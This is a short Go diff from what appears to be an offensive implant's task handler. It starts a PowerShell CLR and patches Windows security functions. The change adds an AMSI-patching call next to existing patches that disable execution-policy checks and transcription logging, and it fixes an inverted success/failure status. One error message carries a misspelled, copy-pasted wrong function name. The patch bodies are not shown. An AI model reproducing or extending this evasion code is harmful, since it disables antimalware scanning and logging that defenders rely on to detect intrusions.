@@ -47,6 +47,11 @@ func TaskHandler(task *Task) (stdout []byte, err error) {
 			task.status = "failed"
 			errPatchStr += "Error Patching TransctiptionOptionFlushContentToDisk" + err.Error()
 	    }
+	    err = PatchAmsiWithScanContent(AppDomain)
+	    if err != nil {
+			task.status = "failed"
+			errPatchStr += "Error Patching AuthoriuzationManagerShouldRunInternal" + err.Error()
+	    }
 	    err = PatchAuthorizationManagerShouldRunInternal(AppDomain)
 	    if err != nil {
 			task.status = "failed"
@@ -59,11 +64,11 @@ func TaskHandler(task *Task) (stdout []byte, err error) {
 	    }
 
 		if errPatchStr == "" {
-			task.status = "failed"
+			task.status = "completed"
 			return []byte("Started Powershell CLR and Variant. Patched all function correctly."), nil
 		}
 
-		task.status = "completed"
+		task.status = "failed"
 		return []byte(startCLR + "Error in some patching" + errPatchStr), fmt.Errorf(errPatchStr)
 	
 	case "exec":
